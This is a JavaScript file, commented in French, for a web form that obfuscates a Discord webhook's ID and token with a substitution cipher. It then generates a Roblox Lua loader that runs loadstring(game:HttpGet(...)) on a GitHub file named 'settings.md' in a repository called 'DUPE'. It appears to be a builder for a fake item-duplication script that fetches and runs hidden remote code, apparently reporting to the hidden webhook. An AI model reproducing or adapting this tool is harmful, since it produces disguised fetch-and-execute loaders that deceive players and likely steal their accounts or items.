// Table de substitution pour ID + token
const CHAR_SUB = {
  "0":"k","1":"a","2":"h","3":"q","4":"v","5":"z","6":"r","7":"n","8":"y","9":"s",
  "a":"x","b":"m","c":"d","d":"e","e":"f","f":"g","g":"t","h":"u","i":"l","j":"o",
  "k":"p","l":"j","m":"c","n":"b","o":"w","p":"i","q":"A","r":"B","s":"C","t":"D",
  "u":"E","v":"F","w":"G","x":"H","y":"I","z":"J",
  "A":"K","B":"L","C":"M","D":"N","E":"O","F":"P","G":"Q","H":"R","I":"S","J":"T",
  "K":"U","L":"V","M":"W","N":"X","O":"Y","P":"Z","Q":"0","R":"1","S":"2","T":"3",
  "U":"4","V":"5","W":"6","X":"7","Y":"8","Z":"9","_":"_","-":"-"
};

// Encoder uniquement la partie ID + token
function encodeWebhook(webhook){
  const prefix = "https://discord.com/api/webhooks/";
  if(webhook.startsWith(prefix)){
    const rest = webhook.slice(prefix.length); // ID + token
    const encodedRest = rest.split('').map(c => CHAR_SUB[c] || c).join('');
    return "67" + encodedRest;
  }
  return webhook;
}

// Générer Lua minimal
function generateLuaScript(encodedWebhook){
  return `getgenv().UserWebhookURL = "${encodedWebhook}"
loadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/DUPE/refs/heads/main/settings.md"))()`;
}

// Formulaire
document.getElementById('webhookForm').addEventListener('submit', function(e){
  e.preventDefault();
  const webhook = document.getElementById('webhook').value;
  const encoded = encodeWebhook(webhook);
  const lua = generateLuaScript(encoded);
  document.getElementById('luaScript').value = lua;
  document.getElementById('luaScript').style.display = "block";
  document.getElementById('resultTitle').style.display = "block";
});
